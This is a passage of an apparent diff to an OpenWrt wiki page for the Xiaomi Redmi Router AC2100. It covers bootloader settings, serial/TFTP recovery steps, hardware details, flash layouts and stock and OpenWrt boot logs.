+env set autoboot.command "boot flash 0x200000"
+env save
+</code>
+
+or
+
+<code>
+env unset xiaomi.r3g.bootfw
+env save
+</code>
+
+or set it in BREED web GUI
+
+=== Usage ===
+Boot in to bootloader:
+It can be triggered by holding down the reset button on the device while powering on, until the status light flashes amber.
+Access BREED at 192.168.1.1 with your browser or telnet port 23.
+
+
+==== UART (Serial) ====
+
+If you have enabled UART (i.e. set the boot environment variables ''uart_en=1'', ''boot_wait=on'' and e.g. ''bootdelay=5''), the boot process of the stock boot loader (U-Boot) can be interrupted and images booted via TFTP.
+
+Follow these steps to recover OpenWrt on the device:
+
+  - Download the OpenWrt ''initramfs.bin'' and ''sysupgrade.bin'' from the [[https://firmware-selector.openwrt.org/?version=21.02.1&target=ramips%2Fmt7621&id=xiaomi_redmi-router-ac2100| firmware selector]]
+  - [[:docs:guide-user:troubleshooting:tftpserver|Start a TFTP server]] on your computer serving ''initramfs.bin'' from a static IP (e.g. ''192.168.31.100'') and connect to the router via ethernet
+  - Connect to the [[toh:xiaomi:xiaomi_redmi_router_ac2100#serial|serial port]] with e.g. a USB-TTL dongle.
+  - Reboot the router. After a few steps in the boot process, the following prompt should appear: <code>
+Please choose the operation:
+   1: Load system code to SDRAM via TFTP.
+   2: Load system code then write to Flash via TFTP.
+   3: Boot system code via Flash (default).
+   4: Entr boot command line interface.
+   7: Load Boot Loader code then write to Flash via Serial. 
+   9: Load Boot Loader code then write to Flash via TFTP. </code> Press ''1'' before the countdown is over.
+  - Enter a suitable device IP (e.g. ''192.168.31.1''), set your computer's IP as the server IP and enter the exact filename of ''initramfs.bin''
+  - The router should now boot to OpenWrt.
+
+Proceed by flashing ''sysupgrade.bin'' [[:docs:guide-quick-start:sysupgrade.luci|via LuCI]] to reinstall OpenWrt.
+
+Example boot log (excerpt):
+
+<WRAP bootlog>
+<nowiki>
+===================================================================
+
+     		MT7621   stage1 code done 
+
+     		CPU=50000000 HZ BUS=16666666 HZ
+
+===================================================================
+
+
+
+U-Boot 1.1.3 (Sep 21 2020 - 11:47:48)
+
+
+Board: Ralink APSoC DRAM:  128 MB
+
+Power on memory test. Memory size= 128 MB...OK!
+
+relocate_code Pointer at: 87fa4000
+
+
+Config XHCI 40M PLL 
+
+******************************
+
+Software System Reset Occurred
+
+******************************
+
+Allocate 16 byte aligned buffer: 87fe0150
+
+Enable NFI Clock
+
+# MTK NAND # : Use HW ECC
+
+NAND ID [C8 D1 80 95 40]
+
+Device found in MTK table, ID: c8d1, EXT_ID: 809540
+
+Support this Device in MTK table! c8d1 
+
+select_chip
+
+[NAND]select ecc bit:4, sparesize :64 spare_per_sector=16
+
+Signature matched and data read!
+
+load_fact_bbt success 1023
+
+load fact bbt success
+
+[mtk_nand] probe successfully!
+
+mtd->writesize=2048 mtd->oobsize=64,	mtd->erasesize=131072  devinfo.iowidth=8
+
+..============================================ 
+
+Ralink UBoot Version: 5.0.0.0
+
+-------------------------------------------- 
+
+ASIC MT7621A DualCore (MAC to MT7530 Mode)
+
+DRAM_CONF_FROM: Auto-Detection 
+
+DRAM_TYPE: DDR3 
+
+DRAM bus: 16 bit
+
+Xtal Mode=3 OCP Ratio=1/3
+
+Flash component: NAND Flash
+
+Date:Sep 21 2020  Time:11:47:48
+
+============================================ 
+
+icache: sets:256, ways:4, linesz:32 ,total:32768
+
+dcache: sets:256, ways:4, linesz:32 ,total:32768 
+
+
+ ##### The CPU freq = 880 MHZ #### 
+
+ estimate memory size =128 Mbytes
+
+#Reset_MT7530
+
+set LAN/WAN WLLLL
+
+
+Please choose the operation: 
+
+   1: Load system code to SDRAM via TFTP. 
+
+   2: Load system code then write to Flash via TFTP. 
+
+   3: Boot system code via Flash (default).
+
+   4: Entr boot command line interface.
+
+   7: Load Boot Loader code then write to Flash via Serial. 
+
+   9: Load Boot Loader code then write to Flash via TFTP. 
+
+ 4 
+
+
+You choosed 1
+
+
+ 0 
+
+
+   
+
+1: System Load Linux to SDRAM via TFTP. 
+
+ Please Input new ones /or Ctrl-C to discard
+
+	Input device IP (192.168.31.1) ==:192.168.31.1 1
+
+	Input server IP (192.168.31.100) ==:192.168.31.100
+
+	Input Linux Kernel filename () ==:initramfs.bin
+
+
+ NetTxPacket = 0x87FE4240 
+
+
+ KSEG1ADDR(NetTxPacket) = 0xA7FE4240 
+
+
+ NetLoop,call eth_halt ! 
+
+
+ NetLoop,call eth_init ! 
+
+Trying Eth0 (10/100-M)
+
+
+ Waitting for RX_DMA_BUSY status Start... done
+
+
+
+ ETH_STATE_ACTIVE!! 
+
+TFTP from server 192.168.31.100; our IP address is 192.168.31.1
+
+Filename 'initramfs.bin'.
+
+
+ TIMEOUT_COUNT=10,Load address: 0x80a00000
+
+Loading: *Got ARP REPLY, set server/gtwy eth addr (10:dd:b1:d7:a0:0d)
+
+Got it
+
+#################################################################
+
+	 #################################################################
+
+	 #################################################################
+
+	 #################################################################
+
+	 #################################################################
+
+	 #################################################################
+
+	 #################################################################
+
+	 #################################################################
+
+	 #################################################################
+
+	 #################################################################
+
+	 #################################################################
+
+	 #################################################################
+
+	 #################################################################
+
+	 #################################################################
+
+	 ########################################################
+
+done
+
+Bytes transferred = 4942483 (4b6a93 hex)
+
+LoadAddr=80a00000 NetBootFileXferSize= 004b6a93
+
+..ranand_erase: start:80000, len:20000 
+
+..Done!
+
+done
+
+Automatic boot of image at addr 0x80A00000 ...
+
+## Booting image at 80a00000 ...
+
+   Image Name:   MIPS OpenWrt Linux-5.4.154
+
+   Image Type:   MIPS Linux Kernel Image (uncompressed)
+
+   Data Size:    4942419 Bytes =  4.7 MB
+
+   Load Address: 80001000
+
+   Entry Point:  80001000
+
+   Verifying Checksum ... OK
+
+OK
+
+commandline uart_en=1 factory_mode=0
+
+No initrd
+
+## Transferring control to Linux (at address 80001000) ...
+
+## Giving linux memsize in MB, 128
+
+
+Starting kernel ...
+
+
+
+
+OpenWrt kernel loader for MIPS based SoC
+
+Copyright (C) 2011 Gabor Juhos <juhosg@openwrt.org>
+
+Decompressing kernel... done!
+
+Starting kernel at 80001000...
+
+
+[    0.000000] Linux version 5.4.154 (builder@buildhost) (gcc version 8.4.0 (OpenWrt GCC 8.4.0 r16325-88151b8303)) #0 SMP Sun Oct 24 09:01:35 2021
+
+</nowiki>
+</WRAP>\\
+
+/*** if info available: uncomment and fill in
+===== Failsafe mode =====
+-> [[docs:guide-user:troubleshooting:failsafe_and_factory_reset]]
+***/
+
+
+/*** if info available: uncomment and fill in
+===== Basic configuration =====
+After flashing, proceed with [[docs:guide-user:base-system:start|Basic configuration]]: Set up your Internet connection, configure wireless, configure USB port, etc.
+***/
+
+
+/*** if info available: uncomment and fill in
+===== Specific configuration =====
+
+<WRAP BOX 600px>
+FIXME Please fill in real values for this device, then remove the EXAMPLEs and the WRAP that encloses this text.
+
+==== Network interfaces ====
+The default network configuration is:
+^ Interface Name   ^ Description                  ^ Default configuration    ^
+| br-lan           | EXAMPLE LAN & WiFi           | EXAMPLE 192.168.1.1/24   |
+| vlan0 (eth0.0)   | EXAMPLE LAN ports (1 to 4)   | EXAMPLE None             |
+| vlan1 (eth0.1)   | EXAMPLE WAN port             | EXAMPLE DHCP             |
+| wl0              | EXAMPLE WiFi                 | EXAMPLE Disabled         |
+</WRAP>
+***/
+
+
+/*** if info available: uncomment and fill in
+==== Buttons ====
+-> [[docs:guide-user:hardware:hardware.button]] on howto use and configure the hardware button(s).
+Here, we merely name the buttons, so we can use them in the above Howto.
+
+<WRAP BOX 600px>
+FIXME Please fill in real values for this device, then remove the EXAMPLEs and the WRAP that encloses this text.
+
+The Xiaomi Redmi Router AC2100 has the following buttons:
+
+^ BUTTON                       ^ Event   ^
+| EXAMPLE Reset                |  reset  |
+| EXAMPLE Secure Easy Setup    |   ses   |
+| EXAMPLE No buttons at all.   |    -    |
+</WRAP>
+***/
+
+
+===== Hardware =====
+==== Info ====
+^ Architecture     | MIPS                         |
+^ Vendor           | MediaTek                     |
+^ Bootloader       | U-Boot                       |
+^ System-On-Chip   | MediaTek MT7621              |
+^ CPU/Speed        | mipsel_24kc @ 880MHz 2 core  |
+^ Flash-Chip       | ESMT F59L1G81MB              |
+^ Flash size       | 128 MiB                      |
+^ RAM              | 128 MiB                      |
+^ Wireless         | MT7603 2.4GHz 802.11bgn + MT7615 5.0GHz 802.11ac  |
+^ Ethernet         | 4x 10/100/1000 Mbit/s        |
+^ Switch           | MediaTek MT7530              |
+^ USB              | None                         |
+^ Serial           | [[#Serial|Yes]]              |
+^ JTAG             | Not populated                |
+
+
+==== Flash Layout ====
+
+=== Stock ===
+
+<code>
+0x000000000000-0x000007f80000 : "ALL"
+0x000000000000-0x000000080000 : "Bootloader"
+0x000000080000-0x0000000c0000 : "Config"
+0x0000000c0000-0x000000100000 : "Bdata"
+0x000000100000-0x000000140000 : "Factory"
+0x000000140000-0x000000180000 : "crash"
+0x000000180000-0x0000001c0000 : "crash_syslog"
+0x0000001c0000-0x000000200000 : "cfg_bak"
+0x000000200000-0x000000600000 : "kernel0"
+0x000000600000-0x000000a00000 : "kernel1"
+0x000000a00000-0x000002400000 : "rootfs0"
+0x000002400000-0x000003e00000 : "rootfs1"
+0x000003e00000-0x000006400000 : "overlay"
+0x000006400000-0x000007f80000 : "obr"
+</code>
+
+=== OpenWrt ===
+
+<code>
+0x000000000000-0x000000080000 : "Bootloader"
+0x000000080000-0x0000000c0000 : "Config"
+0x0000000c0000-0x000000100000 : "Bdata"
+0x000000100000-0x000000140000 : "factory"
+0x000000140000-0x000000180000 : "crash"
+0x000000180000-0x0000001c0000 : "crash_syslog"
+0x0000001c0000-0x000000200000 : "reserved0"
+0x000000200000-0x000000600000 : "kernel_stock"
+0x000000600000-0x000000a00000 : "kernel"
+0x000000a00000-0x000007f80000 : "ubi"
+</code>
+
+
+==== Photos ====
+{{:media:xiaomi:redmi-router-ac2100-top.jpg?400|}}
+
+{{:media:xiaomi:redmi-router-ac2100-bottom.jpg?400|}}
+
+{{:media:xiaomi:redmi-router-ac2100-back.jpg?400|}}
+
+==== Opening the case ====
+
+There are two Phillips head screws hidden behind the label on the bottom. Once these are removed, the case can be pried open all along one side (the one without connectors) with a flat head screwdriver.
+
+==== Serial ====
+-> [[docs:techref:hardware:port.serial]] general information about the serial port, serial port cable, etc.
+
+Location of the serial port on the PCB:
+
+{{:media:xiaomi:redmi-router-ac2100-pcb.jpg?400|}}
+
+Zoom-in:
+
+{{:media:xiaomi:redmi-router-ac2100-pcb-serial.jpg?400|}}
+
+<a2s>
+#----------------#
+|#-# .-. .-. .-. |
+|#-# '-' '-' '-' |
+#----------------# J1
+ VCC  RX  GND  TX
+</a2s>
+
+^ Parameters|
+|Baud Rate | 115200 |
+|Configuration | 8N1 |
+|Voltage | 3.3 V |
+
+===== Bootlogs =====
+==== OEM bootlog ====
+<WRAP bootlog>
+<nowiki>===================================================================
+
+     		MT7621   stage1 code Nov  5 2019 00:23:11 (ASIC)
+
+     		CPU=50000000 HZ BUS=16666666 HZ
+
+==================================================================
+
+RALINK_GPIOMODE = ad428
+
+GPIO0~31 DIR = 40
+
+GPIO0~31 DATA = fff41517
+
+Set gpio_4,3 direction to input
+
+Set gpio_10,6 direction to output
+
+GPIO0~31 DIR = 440
+
+GPIO0~31 DATA = fff41517
+
+Set gpio_6 output value to 0
+
+Set gpio_10 output value to 1
+
+GPIO0~31 DATA = fff41517
+
+Change MPLL source from XTAL to CR...
+
+do MEMPLL setting..
+
+MEMPLL Config : 0x11100000
+
+3PLL mode + External loopback
+
+=== XTAL-40Mhz ===dram_speed=:1200
+
+=== DDR-1200Mhz ===
+
+PLL4 FB_DL: 0xc, 1/0 = 556/468 31000000
+
+PLL2 FB_DL: 0x11, 1/0 = 639/385 45000000
+
+PLL3 FB_DL: 0x1e, 1/0 = 554/470 79000000
+
+do DDR setting..[00320381]
+
+Apply DDR3 Setting...(use customer AC)
+
+          0    8   16   24   32   40   48   56   64   72   80   88   96  104  112  120
+
+      --------------------------------------------------------------------------------
+
+0000:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0001:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0002:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0003:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0004:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0005:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0006:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0007:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0008:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0009:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+000A:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+000B:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+000C:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+000D:|    0    0    0    0    0    0    0    0    0    0    0    0    0    1    1    1
+
+000E:|    0    0    0    0    0    0    0    1    1    1    1    1    1    1    1    1
+
+000F:|    0    0    0    1    1    1    1    1    1    1    1    1    1    0    0    0
+
+0010:|    1    1    1    1    1    1    1    0    0    0    0    0    0    0    0    0
+
+0011:|    1    1    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0012:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0013:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0014:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0015:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0016:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0017:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0018:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+0019:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+001A:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+001B:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+001C:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+001D:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+001E:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+001F:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
+
+DRAMC_DQSCTL1[0e0]=13000000
+
+DRAMC_DQSGCTL[124]=80000033
+
+rank 0 coarse = 15
+
+rank 0 fine = 64
+
+B:|    0    0    0    0    0    0    0    0    0    1    1    1    0    0    0    0
+
+opt_dle value:10
+
+DRAMC_DDR2CTL[07c]=C287222D
+
+DRAMC_PADCTL4[0e4]=000022B3
+
+DRAMC_DQIDLY1[210]=0C0A0907
+
+DRAMC_DQIDLY2[214]=06080907
+
+DRAMC_DQIDLY3[218]=0B080707
+
+DRAMC_DQIDLY4[21c]=0A080A09
+
+DRAMC_R0DELDLY[018]=00001D1E
+
+==================================================================
+
+		RX	DQS perbit delay software calibration 
+
+==================================================================
+
+1.0-15 bit dq delay value
+
+==================================================================
+
+bit|     0  1  2  3  4  5  6  7  8  9
+
+--------------------------------------
+
+0 |    7 8 9 11 6 9 7 6 7 6 
+
+10 |    8 9 9 9 8 8 
+
+--------------------------------------
+
+
+
+
+==================================================================
+
+2.dqs window
+
+x=pass dqs delay value (min~max)center 
+
+y=0-7bit DQ of every group
+
+input delay:DQS0 =30 DQS1 = 29
+
+==================================================================
+
+bit	DQS0	 bit      DQS1
+
+0  (1~59)30  8  (2~56)29
+
+1  (1~58)29  9  (1~56)28
+
+2  (1~58)29  10  (1~57)29
+
+3  (1~58)29  11  (1~54)27
+
+4  (1~58)29  12  (2~57)29
+
+5  (1~60)30  13  (1~55)28
+
+6  (1~58)29  14  (1~58)29
+
+7  (1~60)30  15  (1~53)27
+
+==================================================================
+
+3.dq delay value last
+
+==================================================================
+
+bit|    0  1  2  3  4  5  6  7  8   9
+
+--------------------------------------
+
+0 |    7 9 10 12 7 9 8 6 7 7 
+
+10 |    8 11 9 10 8 10 
+
+==================================================================
+
+==================================================================
+
+     TX  perbyte calibration 
+
+==================================================================
+
+DQS loop = 15, cmp_err_1 = ffff2000 
+
+dqs_perbyte_dly.last_dqsdly_pass[0]=15,  finish count=1 
+
+DQS loop = 14, cmp_err_1 = ffff0000 
+
+dqs_perbyte_dly.last_dqsdly_pass[1]=14,  finish count=2 
+
+DQ loop=15, cmp_err_1 = ffff0000
+
+dqs_perbyte_dly.last_dqdly_pass[0]=15,  finish count=1 
+
+dqs_perbyte_dly.last_dqdly_pass[1]=15,  finish count=2 
+
+byte:0, (DQS,DQ)=(8,8)
+
+byte:1, (DQS,DQ)=(8,8)
+
+DRAMC_DQODLY1[200]=88888888
+
+DRAMC_DQODLY2[204]=88888888
+
+20,data:88
+
+[EMI] DRAMC calibration passed
+
+
+
+
+===================================================================
+
+     		MT7621   stage1 code done 
+
+     		CPU=50000000 HZ BUS=16666666 HZ
+
+===================================================================
+
+
+
+U-Boot 1.1.3 (Nov 25 2019 - 01:45:38)
+
+
+Board: Ralink APSoC DRAM:  128 MB
+
+Power on memory test. Memory size= 128 MB...OK!
+
+relocate_code Pointer at: 87fa4000
+
+
+Config XHCI 40M PLL 
+
+Allocate 16 byte aligned buffer: 87fe0130
+
+Enable NFI Clock
+
+# MTK NAND # : Use HW ECC
+
+NAND ID [C8 D1 80 95 40]
+
+Device found in MTK table, ID: c8d1, EXT_ID: 809540
+
+Support this Device in MTK table! c8d1 
+
+select_chip
+
+[NAND]select ecc bit:4, sparesize :64 spare_per_sector=16
+
+Signature matched and data read!
+
+load_fact_bbt success 1023
+
+load fact bbt success
+
+[mtk_nand] probe successfully!
+
+mtd->writesize=2048 mtd->oobsize=64,	mtd->erasesize=131072  devinfo.iowidth=8
+
+..============================================ 
+
+Ralink UBoot Version: 5.0.0.0
+
+-------------------------------------------- 
+
+ASIC MT7621A DualCore (MAC to MT7530 Mode)
+
+DRAM_CONF_FROM: Auto-Detection 
+
+DRAM_TYPE: DDR3 
+
+DRAM bus: 16 bit
+
+Xtal Mode=3 OCP Ratio=1/3
+
+Flash component: NAND Flash
+
+Date:Nov 25 2019  Time:01:45:38
+
+============================================ 
+
+icache: sets:256, ways:4, linesz:32 ,total:32768
+
+dcache: sets:256, ways:4, linesz:32 ,total:32768 
+
+
+ ##### The CPU freq = 880 MHZ #### 
+
+ estimate memory size =128 Mbytes
+
+#Reset_MT7530
+
+set LAN/WAN WLLLL
+
+
+Please choose the operation: 
+
+   1: Load system code to SDRAM via TFTP. 
+
+   2: Load system code then write to Flash via TFTP. 
+
+   3: Boot system code via Flash (default).
+
+   4: Entr boot command line interface.
+
+   7: Load Boot Loader code then write to Flash via Serial. 
+
+   9: Load Boot Loader code then write to Flash via TFTP. 
+
+
+Booting System 1
+
+..ranand_erase: start:80000, len:20000 
+
+..Done!
+
+done
+
+   
+
+3: System Boot system code via Flash.
+
+## Booting image at bc200000 ...
+
+   Image Name:   MIPS OpenWrt Linux-3.10.14
+
+   Image Type:   MIPS Linux Kernel Image (lzma compressed)
+
+   Data Size:    3389967 Bytes =  3.2 MB
+
+   Load Address: 81001000
+
+   Entry Point:  81436040
+
+....................................................   Verifying Checksum ... OK
+
+   Uncompressing Kernel Image ... OK
+
+commandline uart_en=0 factory_mode=0
+
+No initrd
+
+## Transferring control to Linux (at address 81436040) ...
+
+## Giving linux memsize in MB, 128
+
+
+Starting kernel ...
+
+
+
+
+LINUX started...
+
+ THIS IS ASIC
+
+SDK 5.0.S.0
+[    0.000000] Initializing cgroup subsys cpuset
+[    0.000000] Initializing cgroup subsys cpu
+[    0.000000] Linux version 3.10.14 (jenkins@7f34258e3bac) (gcc version 4.8.5 (crosstool-NG crosstool-ng-1.22.0) ) #1 MiWiFi-RM2100-1.0.11 SMP Mon Nov 25 01:53:32 UTC 2019
+[    0.000000] 
+[    0.000000]  The CPU feqenuce set to 880 MHz
+[    0.000000] GCMP present
+[    0.000000] CPU0 revision is: 0001992f (MIPS 1004Kc)
+[    0.000000] Software DMA cache coherency
+[    0.000000] Determined physical RAM map:
+[    0.000000]  memory: 08000000 @ 00000000 (usable)
+[    0.000000] Initrd not found or empty - disabling initrd
+[    0.000000] Zone ranges:
+[    0.000000]   DMA      [mem 0x00000000-0x00ffffff]
+[    0.000000]   Normal   [mem 0x01000000-0x07ffffff]
+[    0.000000] Movable zone start for each node
+[    0.000000] Early memory node ranges
+[    0.000000]   node   0: [mem 0x00000000-0x07ffffff]
+[    0.000000] Detected 3 available secondary CPU(s)
+[    0.000000] Primary instruction cache 32kB, 4-way, VIPT, linesize 32 bytes.
+[    0.000000] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
+[    0.000000] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
+[    0.000000] PERCPU: Embedded 7 pages/cpu @81843000 s6912 r8192 d13568 u32768
+[    0.000000] Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 32512
+[    0.000000] Kernel command line: console=ttyS1,115200n8 root=/dev/mtdblock5 uart_en=0 factory_mode=0
+[    0.000000] PID hash table entries: 512 (order: -1, 2048 bytes)
+[    0.000000] Dentry cache hash table entries: 16384 (order: 4, 65536 bytes)
+[    0.000000] Inode-cache hash table entries: 8192 (order: 3, 32768 bytes)
+[    0.000000] Writing ErrCtl register=00050000
+[    0.000000] Readback ErrCtl register=00050000
+[    0.000000] allocated 262144 bytes of page_cgroup
+[    0.000000] please try 'cgroup_disable=memory' option if you don't want memory cgroups
+[    0.000000] Memory: 122132k/131072k available (4357k kernel code, 8940k reserved, 1127k data, 1612k init, 0k highmem)
+[    0.000000] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=4, Nodes=1
+[    0.000000] Hierarchical RCU implementation.
+[    0.000000] NR_IRQS:128
+[    0.000000] console [ttyS1] enabled
+[    0.130000] Calibrating delay loop... 577.53 BogoMIPS (lpj=2887680)
+[    0.190000] pid_max: default: 32768 minimum: 301
+[    0.190000] Mount-cache hash table entries: 512
+[    0.200000] Initializing cgroup subsys memory
+[    0.200000] launch: starting cpu1
+[    0.210000] launch: cpu1 gone!
+[    0.210000] CPU1 revision is: 0001992f (MIPS 1004Kc)
+[    0.210000] Primary instruction cache 32kB, 4-way, VIPT, linesize 32 bytes.
+[    0.210000] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
+[    0.210000] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
+[    0.270000] Synchronize counters for CPU 1: done.
+[    0.280000] launch: starting cpu2
+[    0.280000] launch: cpu2 gone!
+[    0.280000] CPU2 revision is: 0001992f (MIPS 1004Kc)
+[    0.280000] Primary instruction cache 32kB, 4-way, VIPT, linesize 32 bytes.
+[    0.280000] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
+[    0.280000] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
+[    0.340000] Synchronize counters for CPU 2: done.
+[    0.350000] launch: starting cpu3
+[    0.350000] launch: cpu3 gone!
+[    0.350000] CPU3 revision is: 0001992f (MIPS 1004Kc)
+[    0.350000] Primary instruction cache 32kB, 4-way, VIPT, linesize 32 bytes.
+[    0.350000] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes
+[    0.350000] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.
+[    0.410000] Synchronize counters for CPU 3: done.
+[    0.420000] Brought up 4 CPUs
+[    0.420000] devtmpfs: initialized
+[    0.420000] NET: Registered protocol family 16
+[    0.660000] release PCIe RST: RALINK_RSTCTRL = 7000000
+[    0.660000] PCIE PHY initialize
+[    0.660000] ***** Xtal 40MHz *****
+[    0.670000] start MT7621 PCIe register access
+[    1.120000] RALINK_RSTCTRL = 7000000
+[    1.130000] RALINK_CLKCFG1 = 73ffeff8
+[    1.130000] 
+[    1.130000] *************** MT7621 PCIe RC mode *************
+[    1.510000] pcie_link status = 0x3
+[    1.510000] RALINK_RSTCTRL= 7000000
+[    1.520000] *** Configure Device number setting of Virtual PCI-PCI bridge ***
+[    1.530000] RALINK_PCI_PCICFG_ADDR = 21007f2 -> 21007f2
+[    1.530000] PCIE0 enabled
+[    1.530000] PCIE1 enabled
+[    1.540000] interrupt enable status: 300000
+[    1.540000] Port 1 N_FTS = 1b105000
+[    1.540000] Port 0 N_FTS = 1b105000
+[    1.550000] config reg done
+[    1.550000] init_rt2880pci done
+[    1.570000] bio: create slab <bio-0> at 0
+[    1.580000] SCSI subsystem initialized
+[    1.580000] PCI host bridge to bus 0000:00
+[    1.590000] pci_bus 0000:00: root bus resource [mem 0x60000000-0x6fffffff]
+[    1.600000] pci_bus 0000:00: root bus resource [io  0x1e160000-0x1e16ffff]
+[    1.600000] pci_bus 0000:00: No busn resource found for root bus, will use [bus 00-ff]
+[    1.610000] pci 0000:00:00.0: bridge configuration invalid ([bus 00-00]), reconfiguring
+[    1.620000] pci 0000:00:01.0: bridge configuration invalid ([bus 00-00]), reconfiguring
+[    1.630000] pci 0000:00:00.0: BAR 0: can't assign mem (size 0x80000000)
+[    1.630000] pci 0000:00:01.0: BAR 0: can't assign mem (size 0x80000000)
+[    1.640000] pci 0000:00:00.0: BAR 8: assigned [mem 0x60000000-0x600fffff]
+[    1.650000] pci 0000:00:01.0: BAR 8: assigned [mem 0x60100000-0x601fffff]
+[    1.650000] pci 0000:00:00.0: BAR 1: assigned [mem 0x60200000-0x6020ffff]
+[    1.660000] pci 0000:00:01.0: BAR 1: assigned [mem 0x60210000-0x6021ffff]
+[    1.670000] pci 0000:01:00.0: BAR 0: assigned [mem 0x60000000-0x600fffff 64bit]
+[    1.680000] pci 0000:00:00.0: PCI bridge to [bus 01]
+[    1.680000] pci 0000:00:00.0:   bridge window [mem 0x60000000-0x600fffff]
+[    1.690000] pci 0000:02:00.0: BAR 0: assigned [mem 0x60100000-0x601fffff]
+[    1.690000] pci 0000:00:01.0: PCI bridge to [bus 02]
+[    1.700000] pci 0000:00:01.0:   bridge window [mem 0x60100000-0x601fffff]
+[    1.710000] PCI: Enabling device 0000:00:00.0 (0004 -> 0006)
+[    1.710000] PCI: Enabling device 0000:00:01.0 (0004 -> 0006)
+[    1.720000] BAR0 at slot 0 = 0
+[    1.720000] bus=0x0, slot = 0x0
+[    1.720000] res[0]->start = 0
+[    1.730000] res[0]->end = 0
+[    1.730000] res[1]->start = 60200000
+[    1.730000] res[1]->end = 6020ffff
+[    1.740000] res[2]->start = 0
+[    1.740000] res[2]->end = 0
+[    1.740000] res[3]->start = 0
+[    1.740000] res[3]->end = 0
+[    1.750000] res[4]->start = 0
+[    1.750000] res[4]->end = 0
+[    1.750000] res[5]->start = 0
+[    1.760000] res[5]->end = 0
+[    1.760000] BAR0 at slot 1 = 0
+[    1.760000] bus=0x0, slot = 0x1
+[    1.760000] res[0]->start = 0
+[    1.770000] res[0]->end = 0
+[    1.770000] res[1]->start = 60210000
+[    1.770000] res[1]->end = 6021ffff
+[    1.780000] res[2]->start = 0
+[    1.780000] res[2]->end = 0
+[    1.780000] res[3]->start = 0
+[    1.790000] res[3]->end = 0
+[    1.790000] res[4]->start = 0
+[    1.790000] res[4]->end = 0
+[    1.790000] res[5]->start = 0
+[    1.800000] res[5]->end = 0
+[    1.800000] bus=0x1, slot = 0x0, irq=0x4
+[    1.800000] res[0]->start = 60000000
+[    1.810000] res[0]->end = 600fffff
+[    1.810000] res[1]->start = 0
+[    1.810000] res[1]->end = 0
+[    1.820000] res[2]->start = 0
+[    1.820000] res[2]->end = 0
+[    1.820000] res[3]->start = 0
+[    1.830000] res[3]->end = 0
+[    1.830000] res[4]->start = 0
+[    1.830000] res[4]->end = 0
+[    1.830000] res[5]->start = 0
+[    1.840000] res[5]->end = 0
+[    1.840000] bus=0x2, slot = 0x1, irq=0x18
+[    1.840000] res[0]->start = 60100000
+[    1.850000] res[0]->end = 601fffff
+[    1.850000] res[1]->start = 0
+[    1.850000] res[1]->end = 0
+[    1.860000] res[2]->start = 0
+[    1.860000] res[2]->end = 0
+[    1.860000] res[3]->start = 0
+[    1.870000] res[3]->end = 0
+[    1.870000] res[4]->start = 0
+[    1.870000] res[4]->end = 0
+[    1.870000] res[5]->start = 0
+[    1.880000] res[5]->end = 0
+[    1.880000] Switching to clocksource MIPS
+[    1.890000] cfg80211: Calling CRDA to update world regulatory domain
+[    1.890000] NET: Registered protocol family 2
+[    1.890000] TCP established hash table entries: 1024 (order: 1, 8192 bytes)
+[    1.890000] TCP bind hash table entries: 1024 (order: 1, 8192 bytes)
+[    1.890000] TCP: Hash tables configured (established 1024 bind 1024)
+[    1.890000] TCP: reno registered
+[    1.890000] UDP hash table entries: 256 (order: 1, 8192 bytes)
+[    1.890000] UDP-Lite hash table entries: 256 (order: 1, 8192 bytes)
+[    1.890000] NET: Registered protocol family 1
+[    2.970000] 4 CPUs re-calibrate udelay(lpj = 2924544)
+[    3.000000] squashfs: version 4.0 (2009/01/31) Phillip Lougher
+[    3.000000] msgmni has been set to 238
+[    3.010000] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 253)
+[    3.010000] io scheduler noop registered (default)
+[    3.020000] MIWIFI panic notifier registeredreg_int_mask=0, INT_MASK= 0 
+[    3.030000] HSDMA_init
+[    3.030000] 
+[    3.030000]  hsdma_phy_tx_ring0 = 0x00c00000, hsdma_tx_ring0 = 0xa0c00000
+[    3.040000] 
+[    3.040000]  hsdma_phy_rx_ring0 = 0x00c04000, hsdma_rx_ring0 = 0xa0c04000
